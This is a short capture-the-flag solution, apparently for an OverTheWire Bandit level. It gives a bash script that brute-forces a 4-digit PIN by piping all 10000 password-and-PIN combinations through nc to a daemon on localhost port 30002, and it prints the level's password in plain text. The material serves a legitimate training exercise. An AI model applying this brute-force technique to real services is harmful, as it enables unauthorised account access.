# Level Goal
# A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
# You do not need to create new connections each time


#add this bash script
#<--
#!/bin/bash

for i in {0000..9999}
do
        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt

#-->


wc -l result.txt